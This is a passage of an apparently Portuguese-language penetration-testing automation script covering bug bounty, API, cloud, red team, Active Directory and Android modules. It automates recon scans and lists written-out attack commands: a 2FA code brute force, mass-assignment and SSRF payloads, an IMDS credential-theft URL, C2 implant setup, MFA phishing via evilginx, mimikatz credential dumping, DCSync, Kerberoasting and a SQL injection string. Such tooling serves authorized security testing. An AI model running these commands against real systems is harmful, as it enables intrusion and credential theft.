        if diff:
            findings.add("M2.3", "subdominio novo desde ultima rodada", f"{len(diff)} novo(s)")
            log.warn(f"  {len(diff)} subdominio(s) novo(s) desde a ultima rodada")
    if new_file.exists():
        new_file.replace(old_file)  # vira baseline da proxima execucao

    live_file = recon_dir / "live.txt"
    if require_tool("httpx", log) and old_file.exists() and new_count:
        run(f"httpx -silent -title -sc -l {old_file} -o {live_file}", log, timeout=300)
        live_count = len(live_file.read_text(encoding="utf-8", errors="ignore").splitlines()) if live_file.exists() else 0
        if live_count:
            log.ok(f"  {live_count} host(s) vivo(s) de {new_count} subdominio(s)")
        else:
            log.warn(f"  nenhum dos {new_count} subdominio(s) respondeu em HTTP/HTTPS")
    elif not new_count:
        log.skip("  pulando httpx, nao ha subdominio pra checar (ver aviso do subfinder acima)")

    log.step("M2.6 Vetores de web moderno")
    if not active:
        log.skip("rode com --active pra habilitar nuclei nos hosts vivos encontrados")
    elif not live_file.exists() or not live_file.read_text(encoding="utf-8", errors="ignore").strip():
        log.skip("nenhum host vivo encontrado em M2.3, nada pra rodar nuclei aqui")
    elif require_tool("nuclei", log):
        urls = [l.split()[0] for l in live_file.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
        (exploit_dir / "nuclei_targets.txt").write_text("\n".join(urls), encoding="utf-8")
        run(f"nuclei -l {exploit_dir/'nuclei_targets.txt'} -severity critical,high -silent "
            f"-o {exploit_dir/'nuclei.txt'}", log, timeout=900)
        report_nuclei_findings(exploit_dir / "nuclei.txt", "M2.6", findings, log)

    manual_steps = [
        "M2.5: triar cada achado automatico -- abra `exploit/nuclei.txt` e confirme manualmente "
        "cada linha antes de reportar (self-XSS/CSRF sem impacto normalmente nao valem bounty)",
        "M2.7: testar 2FA bypass -- primeiro capture a requisicao real de verificacao (Burp "
        "proxy ligado, fazer o fluxo de 2FA uma vez e olhar no HTTP history, nao adianta chutar "
        "o endpoint). Depois teste nessa requisicao real: 1) reenviar um token de reset de senha "
        "ja usado antes; 2) `ffuf -u <URL_REAL_CAPTURADA> -X POST -d 'code=FUZZ' -w "
        "<(seq -w 0 9999) -mc 200` pra ver se o codigo de 4-6 digitos tem rate limit de verdade; "
        "3) interceptar a resposta que diz '2FA necessario' e forcar o valor pra false/0, ver se "
        "o backend confia so no frontend pra bloquear",
        f"M2.8: escrever o relatorio no formato da plataforma (programa: {program or 'definir'})",
        f"Rode esse script periodicamente (cron) pra manter o diff de subdominios atualizado: "
        f"`0 */6 * * * cd {Path(__file__).resolve().parent} && python3 nvkscan.py "
        f"--module bugbounty -d {domain} --program \"{program or 'nome'}\" --skip-auth-gate`",
    ]
    return manual_steps


# =============================================================================
# MODULO 6B -- API PENTEST AVANCADO
# =============================================================================

API_SPEC_PATHS = ["/swagger.json", "/swagger-ui.html", "/openapi.json", "/api-docs",
                  "/v2/api-docs", "/v3/api-docs", "/api/swagger.json", "/graphql", "/graphiql"]


def module_api(domain, url, active, log, findings, workdir, threads=20):
    url = url or f"https://{domain}"
    recon_dir, exploit_dir, enum_dir = workdir / "recon", workdir / "exploit", workdir / "enum"
    enum_dir.mkdir(exist_ok=True)

    log.step("M6B.1 Setup e recon")
    if require_tool("arjun", log):
        run(f"arjun -u {url}/v1/ -m GET -oT {recon_dir/'arjun_api.txt'}", log, timeout=180)

    log.step("M6B.2/M6B.3 BOLA/BOPLA (checagem passiva de spec)")
    # usa o mesmo check_paths() do Modulo 1, que ja tem baseline contra
    # soft-404/SPA catch-all -- sem isso, qualquer app Angular/React devolve
    # 200 generico pra path nenhum existir, e gera falso positivo em todo spec
    hits = check_paths(url, API_SPEC_PATHS, enum_dir / "api_specs.txt", log, "specs de API", threads=threads)
    for h in hits:
        findings.add("M6B.1", "spec de API exposta (confirmado 200)", h + " (valide BOLA/BOPLA/BFLA contra os endpoints listados)")

    # se algum spec OpenAPI/Swagger ficou exposto, baixa e extrai os
    # endpoints REAIS de dentro dele -- isso e o melhor caso possivel pros
    # comandos do M6B.2+ abaixo: endpoint de verdade, nao chute nenhum
    real_api_endpoints = []
    for h in hits:
        spec_url = h.split()[1] if len(h.split()) > 1 else None
        if not spec_url:
            continue
        full_spec_url = url.rstrip("/") + spec_url if spec_url.startswith("/") else spec_url
        try:
            req = urllib.request.Request(full_spec_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=8) as resp:
                spec_data = json.loads(resp.read(200_000))
            paths = spec_data.get("paths", {})
            if paths:
                real_api_endpoints = sorted(paths.keys())[:15]
                log.ok(f"  spec parseado com sucesso, {len(paths)} endpoint(s) real(is) extraido(s) de {spec_url}")
                break
        except Exception:
            continue

    log.step("M6B.5 Rate limiting (checagem leve, so indicativa)")
    import time as _time
    codes = []
    t0 = _time.time()
    for _ in range(8):
        code, _ = http_get_status(url)
        codes.append(code)
    elapsed = _time.time() - t0
    throttled = any(c in (429, 503) for c in codes)
    if throttled:
        log.ok(f"  rate limit detectado (status 429/503 apareceu em 8 requests, {elapsed:.2f}s)")
    else:
        log.info(f"  8 requests em {elapsed:.2f}s, nenhum 429/503 (amostra pequena, NAO prova ausencia de "
                  f"rate limit, so sinaliza que vale testar com volume maior manualmente)")

    if active and require_tool("nuclei", log):
        run(f"nuclei -u {url} -tags api -severity critical,high,medium -o {exploit_dir/'nuclei_api.txt'}",
            log, timeout=600)
        report_nuclei_findings(exploit_dir / "nuclei_api.txt", "M6B.6", findings, log)

    if real_api_endpoints:
        ex1 = real_api_endpoints[0]
        ex2 = real_api_endpoints[1] if len(real_api_endpoints) > 1 else real_api_endpoints[0]
        lista_endpoints = ", ".join(real_api_endpoints)
        passo_intro = (
            f"M6B.1: o spec exposto foi baixado e parseado -- {len(real_api_endpoints)} endpoint(s) "
            f"REAL(IS) extraido(s): {lista_endpoints} . Os comandos abaixo ja usam um deles de exemplo "
            f"({ex1}), troque pro endpoint que fizer sentido pro teste. Tambem confira "
            f"recon/arjun_api.txt pra parametros ocultos adicionais"
        )
        passo_bola = (
            f"M6B.2: BOLA -- autentique como usuario A e B, pegue o ID de um objeto do A, e com o "
            f"token do B tente acessar: `curl {url}{ex1}/<id_do_objeto_de_A> -H \"Authorization: "
            f"Bearer $TOK_B\"` (se retornar 200 com o dado de A, e BOLA confirmado). Pra testar um "
            f"range inteiro: `ffuf -u {url}{ex1}/FUZZ -w ids.txt -H \"Authorization: Bearer "
            f"$TOK_B\" -mc 200`"
        )
        passo_mass = (
            f"M6B.3/M6B.4: mass assignment -- pegue o body real de um PATCH/PUT legitimo em "
            f"{ex2} (Burp) e acrescente um campo que a API nao deveria aceitar do cliente: "
            f"`curl -X PATCH {url}{ex2} -H \"Authorization: Bearer $TOK\" "
            f"-H \"Content-Type: application/json\" -d '{{\"role\":\"admin\",\"isAdmin\":true}}'` "
            f"(testar 1 campo suspeito por vez, confirmar no GET seguinte se o valor realmente mudou)"
        )
        passo_webhook = (
            f"M6B.8: webhook/SSRF -- dentre os endpoints reais acima, ache o que aceita URL "
            f"(callback, webhook, avatar por URL, import por URL) e aponte pro seu Burp Collaborator: "
            f"`curl {url}<endpoint_com_campo_de_url> -d 'callback_url=http://SEU_ID.burpcollaborator.net/'` "
            f"depois confira o painel do Collaborator por hit (ver Modulo 11.10 do guia)"
        )
    else:
        passo_intro = (
            "M6B.1: nenhum spec (swagger/openapi) ficou exposto nem foi possivel parsear -- os "
            "endpoints reais da API nao sao conhecidos por recon passivo. Confira recon/arjun_api.txt "
            "(parametros ocultos achados) e navegue a aplicacao manualmente (Burp proxy ligado) pra "
            "mapear os endpoints de verdade antes de tentar BOLA/mass assignment -- os comandos abaixo "
            "sao template generico com <recurso_real> no lugar do endpoint, NAO rode sem substituir"
        )
        passo_bola = (
            f"M6B.2: BOLA -- autentique como usuario A e B, pegue o ID de um objeto do A, e com o "
            f"token do B tente acessar: `curl {url}/<recurso_real>/<id_do_objeto_de_A> -H "
            f"\"Authorization: Bearer $TOK_B\"` (se retornar 200 com o dado de A, e BOLA confirmado)"
        )
        passo_mass = (
            f"M6B.3/M6B.4: mass assignment -- pegue o body real de um PATCH/PUT legitimo (Burp) e "
            f"acrescente um campo que a API nao deveria aceitar do cliente: "
            f"`curl -X PATCH {url}/<recurso_real>/me -H \"Authorization: Bearer $TOK\" "
            f"-H \"Content-Type: application/json\" -d '{{\"role\":\"admin\",\"isAdmin\":true}}'`"
        )
        passo_webhook = (
            f"M6B.8: webhook/SSRF -- ache um campo que aceita URL (callback, webhook, avatar por "
            f"URL) e aponte pro seu Burp Collaborator: "
            f"`curl {url}/<endpoint_real> -d 'callback_url=http://SEU_ID.burpcollaborator.net/'` "
            f"depois confira o painel do Collaborator por hit (ver Modulo 11.10 do guia)"
        )

    manual_steps = [
        passo_intro, passo_bola, passo_mass,
        f"M6B.7: kid injection em JWT -- `python3 jwt_tool.py $TOK -X k -pk mykey.pem` "
        f"(github.com/ticarpi/jwt_tool, precisa gerar/ter uma chave propria em mykey.pem)",
        passo_webhook,
    ]
    return manual_steps


# =============================================================================
# MODULO 4 -- CLOUD (AWS / Azure / GCP)
# =============================================================================

def module_cloud(provider, log, findings, workdir, aws_profile=None):
    enum_dir = workdir / "enum"
    aws_flag = f"--profile {aws_profile} " if aws_profile else ""

    if provider in ("aws", "all"):
        log.step("M4.2 Enumeracao credenciada, AWS" + (f" (profile: {aws_profile})" if aws_profile else ""))
        if require_tool("aws", log):
            rc, out = run(f"aws {aws_flag}sts get-caller-identity", log, outfile=enum_dir / "aws_identity.txt", timeout=30)
            if rc == 0:
                findings.add("M4.2", "credencial AWS valida", out.strip()[:150])
            else:
                log.info("  sem credencial AWS ativa (configure com 'aws configure' ou use --aws-profile)")
            rc, out = run(f"aws {aws_flag}iam list-users", log, outfile=enum_dir / "aws_iam_users.txt", timeout=30)
            if rc == 0:
                try:
                    n = len(json.loads(out).get("Users", []))
                    if n:
                        findings.add("M4.2", "usuarios IAM enumerados", f"{n} usuario(s), ver enum/aws_iam_users.txt")
                        log.warn(f"  {n} usuario(s) IAM enumerado(s), revisar policies manualmente (M4.3 Pacu)")
                except Exception:
                    pass
            rc, out = run(f"aws {aws_flag}iam list-roles", log, outfile=enum_dir / "aws_iam_roles.txt", timeout=30)
            if rc == 0:
                try:
                    n = len(json.loads(out).get("Roles", []))
                    if n:
                        findings.add("M4.2", "roles IAM enumeradas", f"{n} role(s), ver enum/aws_iam_roles.txt")
                        log.warn(f"  {n} role(s) IAM enumerada(s), revisar trust policy/permissoes manualmente (M4.3 Pacu)")
                except Exception:
                    pass
        if require_tool("pacu", log):
            log.info("Pacu precisa de sessao interativa (run iam__enum_permissions, iam__privesc_scan) -- ver M4.3")

    if provider in ("azure", "all"):
        log.step("M4.5 Azure")
        if require_tool("az", log):
            rc, out = run("az account show", log, outfile=enum_dir / "az_account.txt", timeout=30)
            if rc == 0:
                findings.add("M4.5", "credencial Azure valida", out.strip()[:150])
                log.warn("  sessao Azure ativa, ver enum/az_account.txt")
            else:
                log.info("  sem credencial Azure ativa (configure com 'az login')")

    if provider in ("gcp", "all"):
        log.step("M4.6 GCP")
        if require_tool("gcloud", log):
            rc, out = run("gcloud auth list", log, outfile=enum_dir / "gcloud_auth.txt", timeout=30)
            if rc == 0 and "no credentialed accounts" not in out.lower():
                findings.add("M4.6", "credencial GCP valida", out.strip()[:150])
                log.warn("  sessao GCP ativa, ver enum/gcloud_auth.txt")
            else:
                log.info("  sem credencial GCP ativa (configure com 'gcloud auth login')")
            rc, out = run("gcloud projects list", log, outfile=enum_dir / "gcloud_projects.txt", timeout=30)
            if rc == 0:
                n = max(0, len(out.strip().splitlines()) - 1)  # -1 pelo cabecalho da tabela
                if n > 0:
                    findings.add("M4.6", "projetos GCP enumerados", f"{n} projeto(s), ver enum/gcloud_projects.txt")
                    log.warn(f"  {n} projeto(s) GCP enumerado(s)")

    manual_steps = [
        f"M4.3: Pacu interativo -- `pacu` depois `set_keys` (cole a credencial), `run "
        f"iam__enum_permissions`, `run iam__privesc_scan` (mapeia caminho de escalonamento automatico)",
        "M4.4: trufflehog nos buckets/repos achados -- `trufflehog s3 --bucket=<nome_do_bucket>` ou "
        "`trufflehog git <url_do_repo>` (precisa da lista de buckets/repos primeiro, ver enum/)",
        "M4.7: testar IMDSv1 bypass -- a partir de uma app comprometida com SSRF, "
        "`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` "
        "(so funciona de dentro da rede da cloud, nao daqui)",
        "M4.8: container/Kubernetes escape -- exige shell no host/pod primeiro (ex.: "
        "`kubectl auth can-i --list` depois de ja ter acesso a um pod), nao e recon remoto",
    ]
    return manual_steps


# =============================================================================
# MODULO 3 -- RED TEAM (so a parte de recon/TTP mapping; C2/phishing/implante
# ficam de fora de proposito -- exigem infraestrutura e julgamento dedicados)
# =============================================================================

APT_GROUPS = {
    "1": ("G0016", "APT29 (Cozy Bear)", "Governo / diplomacia (espionagem, phishing + PowerShell)"),
    "2": ("G0046", "FIN7", "Financeiro / varejo (motivacao financeira, phishing + malware de PoS)"),
    "3": ("G0102", "Wizard Spider", "Saude / educacao (ransomware, operadores do Ryuk/Conti)"),
    "4": ("G0032", "Lazarus Group", "Fintech / criptomoedas (Coreia do Norte, financeiro + destrutivo)"),
    "5": ("G0007", "APT28 (Fancy Bear)", "Governo / militar (espionagem, TTPs diferentes do APT29)"),
    "6": ("G0096", "APT41", "Tecnologia / gaming / supply chain (China, dual espionagem + financeiro)"),
}


def choose_apt_group(interactive):
    """Menu de grupos de ameaca reais do MITRE ATT&CK, cada um mapeado pro
    setor que normalmente faz sentido emular (banco != hospital != governo).
    Sem isso o M3.1 sempre voltava o mesmo grupo fixo (APT29), nao importa o
    alvo/setor do engajamento."""
    if not interactive:
        return APT_GROUPS["1"]  # default nao-interativo: APT29 (mesmo comportamento de antes)
    print()
    print(f"{C.CYAN}[01]{C.RESET} {C.BOLD}selecione o grupo de ameaca pra mapear TTPs{C.RESET}")
    print()
    for k, (gid, name, sector) in APT_GROUPS.items():
        print(f"  {C.RED}{C.BOLD}{k:>2}{C.RESET}  {name:<22}{C.GRAY}{sector}{C.RESET}")
    print()
    if not sys.stdin.isatty():
        return APT_GROUPS["1"]  # sem terminal de verdade, nao tenta input(), cai no default
    choice = input(f"{C.CYAN}❯{C.RESET} grupo [1]: ").strip() or "1"
    return APT_GROUPS.get(choice, APT_GROUPS["1"])


def module_redteam(domain, log, findings, workdir, apt_group=None):
    recon_dir = workdir / "recon"
    group_id, group_name, group_sector = apt_group or APT_GROUPS["1"]
    log.step(f"M3.1 Threat intelligence -> mapeamento de TTPs ({group_name}, so leitura publica)")
    rc, out = run(f"curl -s https://attack.mitre.org/groups/{group_id}/", log, timeout=20)
    # restringe a extracao a tabela "Techniques Used" da pagina, senao o regex
    # tambem pega IDs de navegacao/outras secoes e infla o numero (ja vi dar
    # quase o dobro do real ao rodar na pagina inteira)
    table_match = re.search(r"techniques-used.*?</table>", out, re.S)
    scope = table_match.group(0) if table_match else out
    if not table_match:
        log.warn("  nao achei a tabela 'Techniques Used' na pagina, usando a pagina inteira como fallback "
                 "(numero pode vir inflado com IDs de outras secoes)")
    ttps = sorted(set(re.findall(r"T\d{4}(?:\.\d{3})?", scope)))
    ttp_file = recon_dir / f"ttps_{group_id}_{re.sub(r'[^a-zA-Z0-9]+', '_', group_name).strip('_').lower()}.txt"
    if ttps:
        ttp_file.write_text("\n".join(ttps), encoding="utf-8")
        log.ok(f"  {len(ttps)} TTPs de {group_name} ({group_id}) salvas em recon/{ttp_file.name}, "
               f"perfil: {group_sector}")

    manual_steps = [
        "M3.2: setup de C2 -- `sliver-server` depois `generate --http <redirector_ip> --save impl.bin` "
        "(redirector dedicado, infra separada da sua maquina de dev, nunca C2 direto no IP real)",
        f"M3.3: phishing/acesso inicial (T1566) -- `gophish` (painel web) ou `evilginx3` pra "
        f"capturar sessao com MFA, alvo: {domain} (exige autorizacao explicita no ROE)",
        "M3.4: evasao de defesa (T1562) -- checar AMSI com `[Ref].Assembly.GetType('System.Management"
        ".Automation.AmsiUtils')` no PowerShell antes de qualquer payload; LOTL com binarios "
        "already-trusted (ver lolbas-project.github.io)",
        "M3.5: pos-exploracao -- `mimikatz` (`sekurlsa::logonpasswords`) ou "
        "`impacket-wmiexec dominio/user:senha@IP_ALVO` pra movimento lateral, a partir da sessao C2",
        f"M3.6: emulacao da cadeia de TTPs mapeada no M3.1 (ver recon/{ttp_file.name}) -- "
        f"`Invoke-AtomicTest T1055 -ShowDetailsBrief` pra cada tecnica da lista, em sequencia",
        "M3.6B: Caldera pra emulacao automatizada -- `python3 server.py --insecure` depois acessar "
        "localhost:8888 e montar a adversary profile com as TTPs do M3.1",
        "M3.7: Purple team -- cruzar timestamp de cada tecnica executada com os alertas que o SIEM "
        "do cliente gerou (ou nao gerou), nao automatizavel daqui",
        "M3.8: OPSEC e limpeza -- revisar `history`/Prefetch/Event Logs criados, remover implante "
        "(`kill` na sessao C2) e qualquer persistencia (scheduled task, registry run key) antes de encerrar",
    ]
    return manual_steps


def _extract_open_ports(gnmap_file):
    """Le um .gnmap e devolve a lista de numeros de porta marcados /open/."""
    if not gnmap_file.exists():
        return []
    content = gnmap_file.read_text(encoding="utf-8", errors="ignore")
    return sorted(set(int(m) for m in re.findall(r"(\d+)/open/tcp", content)))


def scan_all_ports_hybrid(target, scans_dir, log, findings, timeout=300):
    """Varredura de porta completa em 2 etapas, pra resolver um problema real
    descoberto em teste: SYN scan em alta taxa (--min-rate alto) atraves de
    NAT (WSL2, VPN corporativa) perde pacotes RST e o nmap confunde "sem
    resposta" com "aberto" -- um teste real chegou a reportar ~300 portas
    falsas abertas num host que so tem 3 portas de verdade. Mas TCP connect
    (-sT) completo em todas as 65535 portas e confiavel, so que demora demais
    (nao terminou nem em 15min no mesmo teste). A solucao: SYN scan rapido
    (so pra achar candidatos) + connect scan SO nos candidatos (rapido,
    porque sao poucas portas, nao 65535) pra confirmar de verdade.

    Retorna a lista de portas confirmadas como realmente abertas.
    """
    fast_prefix = scans_dir / "allports_candidatos"
    rc, _ = run_nmap_live(f"nmap -sS -p- --min-rate 2000 -T4 -Pn {target} -oA {fast_prefix}",
                           log, "SYN scan, 65535 portas", timeout=timeout)
    candidates = _extract_open_ports(Path(str(fast_prefix) + ".gnmap"))
    if not candidates:
        log.ok("  nenhuma porta candidata na varredura rapida (SYN)")
        return []

    log.info(f"  {len(candidates)} porta(s) candidata(s) na varredura rapida, confirmando com TCP connect...")
    confirm_prefix = scans_dir / "allports"
    ports_str = ",".join(str(p) for p in candidates)
    run(f"nmap -sT -p{ports_str} -Pn {target} -oA {confirm_prefix}", log,
        label="TCP connect, confirmando candidatos", timeout=120)
    confirmed = _extract_open_ports(Path(str(confirm_prefix) + ".gnmap"))

    false_positives = len(candidates) - len(confirmed)
    if false_positives > 0:
        log.warn(f"  {false_positives} porta(s) candidata(s) NAO confirmada(s) (provavel corrupcao do SYN "
                 f"scan via NAT, descartadas, nao contam como achado)")
    if confirmed:
        log.ok(f"  {len(confirmed)} porta(s) aberta(s) CONFIRMADA(S) por TCP connect: {ports_str if len(confirmed)==len(candidates) else confirmed}")
        findings.add("M7.5", "portas abertas confirmadas", f"{len(confirmed)} porta(s): {confirmed}")
    else:
        log.warn("  nenhuma porta sobreviveu a confirmacao -- a varredura rapida foi 100% falso positivo")
    return confirmed


# =============================================================================
# MODULO 7 -- DCPT (so recon, SEM auto-exploit -- regra do proprio exame)
# =============================================================================

def module_dcpt(domain, ip, log, findings, workdir):
    scans_dir = workdir / "enum"
    target = ip or domain
    log.step("M7.5 Reconhecimento e varredura")
    if require_tool("nmap", log):
        confirmed_ports = scan_all_ports_hybrid(target, scans_dir, log, findings)
        # timeout fixo de 300s as vezes nao bastava com varias portas
        # confirmadas (deteccao de servico/versao demora mais por porta) --
        # escala com a quantidade de portas, com piso e teto razoaveis
        detailed_timeout = max(180, min(900, 180 + 40 * len(confirmed_ports)))
        rc, nmap_out = run_nmap_live(f"nmap -sV -sC -O {target} -oA {scans_dir/'detailed'}", log,
                                     "deteccao de servico/SO", outfile=None, timeout=detailed_timeout)
        # os proprios scripts NSE (-sC) marcam "VULNERABLE" quando confirmam
        # uma CVE especifica -- isso ficava preso no arquivo .nmap bruto e
        # nunca virava achado no relatorio final, mesmo sendo um sinal forte
        # e ja validado pela propria ferramenta (nao e heuristica nossa)
        vuln_lines = [l.strip() for l in nmap_out.splitlines() if "VULNERABLE" in l]
        if vuln_lines:
            for l in vuln_lines[:10]:
                findings.add("M7.5", "nmap NSE confirmou vulnerabilidade", l)
            log.warn(f"  nmap confirmou {len(vuln_lines)} vulnerabilidade(s) via script NSE, ver enum/detailed.nmap")

    log.step("M7.6/M7.10 Enumeracao SMB/AD")
    smb_denied = False
    if require_tool("enum4linux", log):
        rc, out = run(f"enum4linux -a {target}", log, outfile=scans_dir / "enum4linux.txt",
                      label="enum4linux", timeout=120, retries=1)
        if "NT_STATUS_ACCESS_DENIED" in out:
            smb_denied = True
        else:
            # so contava quando era NEGADO -- quando null session FUNCIONA
            # (usuarios de dominio enumerados, share listavel) isso nunca
            # virava achado, mesmo sendo um dos sinais mais fortes de AD
            # mal configurado que o proprio enum4linux ja confirma sozinho
            user_count = len(re.findall(r"^\s*user:\[", out, re.M | re.I))
            listable_shares = len(re.findall(r"Mapping: OK, Listing: OK", out))
            if user_count:
                findings.add("M7.6", "usuarios de dominio via SMB null session",
                              f"{user_count} usuario(s), ver enum/enum4linux.txt")
                log.warn(f"  null session SMB enumerou {user_count} usuario(s) de dominio")
            if listable_shares:
                findings.add("M7.6", "share(s) SMB listavel(is) anonimamente",
                              f"{listable_shares} share(s), ver enum/enum4linux.txt")
                log.warn(f"  {listable_shares} share(s) SMB listavel(is) sem credencial")

    # M7.10: fallback quando SMB null session e negado -- mesma sequencia do
    # guia (Kerberos/LDAP/rpcclient nao dependem de sessao SMB), so recon,
    # sem credencial nenhuma, por isso seguro de automatizar
    if smb_denied:
        log.warn("  enum4linux negou SMB null session -- rodando fallback do M7.10 (LDAP anonimo, rpcclient isolado)")
        if require_tool("ldapsearch", log):
            rc, out = run(f"ldapsearch -x -H ldap://{target} -s base namingcontexts", log,
                          outfile=scans_dir / "ldap_namingcontexts.txt", label="ldapsearch (anonimo)", timeout=20)
            if rc == 0 and "namingcontexts:" in out.lower():
                findings.add("M7.10", "LDAP aceita bind anonimo", "ver enum/ldap_namingcontexts.txt")
                log.warn("  LDAP aceitou bind anonimo (porta 389) -- naming contexts expostos sem credencial")
        if require_tool("rpcclient", log):
            rc, out = run(f'rpcclient -U "" -N {target} -c "enumdomusers;querydominfo;lsaquery"', log,
                          outfile=scans_dir / "rpcclient_fallback.txt", label="rpcclient (null session)", timeout=20)
            if rc == 0 and "user:" in out.lower():
                findings.add("M7.10", "rpcclient null session enumerou usuarios", "ver enum/rpcclient_fallback.txt")
                log.warn("  rpcclient com null session enumerou usuario(s) de dominio -- ver enum/rpcclient_fallback.txt")

    # M7.10: GPP/cpassword em SYSVOL -- baixa os XML (se o share deixar
    # anonimo) e confere o CONTEUDO, nao so a listagem, pra nao marcar
    # achado so porque existe um .xml qualquer sem cpassword de verdade
    if require_tool("smbclient", log):
        sysvol_dir = scans_dir / "sysvol_xml"
        sysvol_dir.mkdir(exist_ok=True)
        run(f"smbclient //{target}/SYSVOL -N -c 'lcd {sysvol_dir}; recurse; prompt; mget *.xml'",
            log, label="SYSVOL (GPP/cpassword)", timeout=30)
        xml_files = list(sysvol_dir.rglob("*.xml"))
        if xml_files:
            cpassword_hits = [f for f in xml_files
                               if "cpassword" in f.read_text(encoding="utf-8", errors="ignore").lower()]
            if cpassword_hits:
                findings.add("M7.10", "GPP cpassword exposto em SYSVOL",
                              f"{len(cpassword_hits)} arquivo(s), ver enum/sysvol_xml/ -- decriptar com gpp-decrypt")
                log.warn(f"  {len(cpassword_hits)} arquivo(s) com cpassword real em SYSVOL, ver enum/sysvol_xml/")
            else:
                log.ok(f"  {len(xml_files)} XML(s) baixados do SYSVOL, nenhum cpassword encontrado")
        else:
            log.ok("  SYSVOL nao acessivel anonimamente (nao e achado, so nao deu pra testar sem credencial)")

    log.warn("LEMBRETE: a DCPT proibe ferramentas de auto-exploit (sqlmap, modulos de exploit do Metasploit).")
    log.warn("Este modulo so roda recon por isso -- exploracao e 100% manual, igual o exame exige.")

    manual_steps = [
        f"M7.7: SQLi manual (sem sqlmap) -- este modulo so faz recon de rede/AD, NAO navegou a "
        f"aplicacao web do alvo, entao nao ha path/parametro real conhecido ainda. Ache uma URL "
        f"real com parametro navegando a aplicacao (Burp proxy ligado) e so entao teste, ex. de "
        f"sintaxe (troque <caminho_real>?<param_real>=1 pelo que voce encontrar de verdade): "
        f"`curl \"http://{target}/<caminho_real>?<param_real>=1%27%20or%201=1--%20-\"` pra validar, "
        f"depois `ORDER BY N-- -` ate quebrar (acha o numero de colunas), `UNION SELECT NULL,...-- -`",
        "M7.8: Buffer Overflow -- `python3 -c \"print('A'*3000)\"` (fuzzing) -> "
        "`pattern_create.rb -l 3000` -> enviar -> ler EIP -> `pattern_offset.rb -q <EIP>` -> "
        "`!mona bytearray`/`!mona compare` (badchars) -> `!mona jmp -r esp` -> msfvenom com o shellcode",
        f"M7.10: AS-REP Roasting -- `impacket-GetNPUsers <dominio>/ -usersfile users.txt -no-pass "
        f"-dc-ip {target} -outputfile asrep.txt` depois `hashcat -m 18200 asrep.txt rockyou.txt`",
        f"M7.10: Kerberoasting (exige credencial) -- `impacket-GetUserSPNs <dominio>/<user>:<pass> "
        f"-dc-ip {target} -request -outputfile kerb.txt` depois `hashcat -m 13100 kerb.txt rockyou.txt`",
        f"M7.10: cadeia pos-credencial -- `impacket-secretsdump <dominio>/<user>:<pass>@{target} "
        f"-just-dc` (DCSync) e `bloodhound-python -u <user> -p <pass> -d <dominio> -ns {target} -c All`, "
        f"so depois de ja ter pelo menos 1 credencial valida",
        "M7.11: escalacao de privilegio -- `sudo -l`, `find / -perm -4000 -type f 2>/dev/null` (Linux); "
        "`whoami /priv` + rodar winPEAS.exe (Windows) e usar a tabela de vetores do guia (M7.11): "
        "unquoted service path, servico modificavel (`icacls`), AlwaysInstallElevated, tokens "
        "(*Potato), credenciais salvas (`cmdkey /list`), autologon no registro",
    ]
    return manual_steps


# =============================================================================
# MODULO 5 -- MOBILE (analise estatica de um APK fornecido)
# =============================================================================

def module_mobile(apk_path, log, findings, workdir):
    if not apk_path or not Path(apk_path).exists():
        log.skip("informe --apk <caminho> apontando pro APK, nada pra analisar sem o arquivo")
        return ["M5.1: rode de novo com --apk caminho/do/alvo.apk"]

    enum_dir = workdir / "enum"
    log.step("M5.2 Android, analise estatica")
    if require_tool("apktool", log):
        run(f"apktool d {apk_path} -o {enum_dir/'apk_decoded'} -f", log, label="apktool (decode)", timeout=120)
    if require_tool("jadx", log):
        run(f"jadx -d {enum_dir/'apk_src'} {apk_path}", log, label="jadx (decompilacao)", timeout=180)

    decoded = enum_dir / "apk_decoded"
    real_package = None
    if decoded.exists():
        manifest = decoded / "AndroidManifest.xml"
        if manifest.exists():
            content = manifest.read_text(encoding="utf-8", errors="ignore")
            # o pacote real ja esta no manifest decodificado -- nao faz
            # sentido pedir pro usuario adivinhar <package_name> depois,
            # com o apktool ja tendo extraido isso de verdade
            m = re.search(r'package="([\w.]+)"', content)
            if m:
                real_package = m.group(1)
                log.ok(f"  pacote real extraido do manifest: {real_package}")
            for flag in ("debuggable", "allowBackup", "allowUserCertificates"):
                if flag.lower() + '="true"' in content.lower():
                    findings.add("M5.2", f"flag perigosa no manifest", f'{flag}="true"')
                    log.warn(f"  {flag}=\"true\" no AndroidManifest.xml")
        # exige a palavra-chave seguida de algo parecido com um valor
        # atribuido (=, : ou aspas + pelo menos 8 caracteres), senao
        # qualquer string.xml de tela de login bate em "password" so por
        # ter o rotulo "Password:" na UI, sem ser segredo nenhum de verdade
        pattern = re.compile(r"(api[_-]?key|secret|password|aws_[a-z_]+|firebase)[\"'=:]+\s*[a-zA-Z0-9_\-./+]{8,}", re.I)
        hits = []
        for f in decoded.rglob("*.xml"):
            try:
                text = f.read_text(encoding="utf-8", errors="ignore")
            except Exception:
                continue
            if pattern.search(text):
                hits.append(str(f))
        apk_src = enum_dir / "apk_src"
        if apk_src.exists():
            for f in list(apk_src.rglob("*.java"))[:2000]:  # limite de seguranca em apps grandes
                try:
                    text = f.read_text(encoding="utf-8", errors="ignore")
                except Exception:
                    continue
                if pattern.search(text):
                    hits.append(str(f))
        if hits:
            (enum_dir / "possiveis_segredos.txt").write_text("\n".join(hits), encoding="utf-8")
            findings.add("M5.2", "possivel segredo hardcoded", f"{len(hits)} arquivo(s) (XML + Java), ver enum/possiveis_segredos.txt")
            log.warn(f"  {len(hits)} arquivo(s) com possivel segredo hardcoded, ver enum/possiveis_segredos.txt")
        else:
            log.ok("  nenhum segredo hardcoded obvio encontrado (XML + Java)")

    if real_package:
        pkg = real_package
        nota_pkg = f"pacote real extraido do manifest ({pkg})"
    else:
        pkg = "<package_name>"
        nota_pkg = "apktool NAO rodou ou nao extraiu o manifest -- substitua <package_name> manualmente (abra AndroidManifest.xml ou use aapt dump badging pra achar o pacote real)"

    manual_steps = [
        f"M5.3: instrumentacao dinamica -- {nota_pkg}. Instale o APK, depois explore com objection "
        f"(ou frida como alternativa), precisa de device/emulador rodando: "
        f"`adb install {apk_path}` `objection -g {pkg} explore` `frida -U -l script.js -f {pkg}`",
        f"M5.4: Drozer pra IPC -- lista activities/providers/receivers exportados, precisa de "
        f"device via adb: `drozer console connect` `run app.package.attacksurface {pkg}`",
        "M5.5: iOS exige jailbreak + frida-ios-dump, nao automatizavel so com o IPA (bundle ID "
